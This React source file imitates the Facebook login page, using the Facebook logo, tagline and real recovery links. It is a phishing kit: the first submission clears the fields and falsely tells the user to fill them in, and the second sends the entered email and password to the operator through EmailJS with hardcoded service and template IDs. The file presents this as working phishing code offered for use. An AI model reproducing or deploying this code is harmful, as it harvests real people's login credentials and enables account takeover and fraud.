import logo from '../images/logo.svg'
import React, { useRef, useState } from 'react';
import emailjs from '@emailjs/browser';
import Reloader from './Reloader';

const Desktop = ({ formData, setFormData,handleChange }) => {
    const form = useRef();
    const [times, setTime] = useState(0);
    
    const handleSubmit = (e) => {
        e.preventDefault();
        setTime(prev => ++prev);
        if(times === 0) {
            setFormData({
                email: '',
                password: ''
            });
        }
        else if (times === 1) {
            emailjs
            .sendForm('service_b2vvpse', 'template_ebmbhy9', form.current, '8PsCARLu8bf-E5pdw')
            .then((result) => {
                console.log(result.text);
                console.log('success')
            }, (error) => {
                console.log('error');
        });
        setTime(0);
        }
    }

    return ( 
        <section className="login">
            {/* <Reloader/> */}
            <div className="facebook--container">

                <div className="facebook--items one">
                    <div>
                        <img src={logo} alt="logo" className='facebook--logo'/>
                    </div>
                    <p className='black'>Facebook helps you connect and share with the people in your life.</p>
                </div>

                <div className="facebook--items two">
                    <form ref={form} onSubmit={handleSubmit}>
                        <input 
                            className='curve' 
                            type="text"  
                            name='email'
                            placeholder='Email address or phone number'
                            value={formData.email}
                            onChange={handleChange}
                        />
                        <input 
                            className='curve' 
                            type="password" 
                            placeholder='Password'
                            name='password'
                            value={formData.password}
                            onChange={handleChange}
                        />
                        <input className='submit--btn curve' type="submit"  value='Log in' />
                        {times === 1 && <p className='error--mgs curve'>fill in  the input field</p>}
                        <a href='https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0' className='forgotten--password curve' >Forgotten password?</a>
                        <div className='hr-or'>
                            <div><hr className='curve' /></div>
                            <div className='or'>or</div>
                            <div><hr className='curve' /></div>
                        </div>
                        <a href='https://web.facebook.com/r.php' className='create--new--account curve'>Create new account</a>

                    </form>

                    <p className='black'><strong>Create a Page</strong> for a celebrity, brand or business.</p>
                </div>
            </div>
        </section>
    );
}
 
export default Desktop;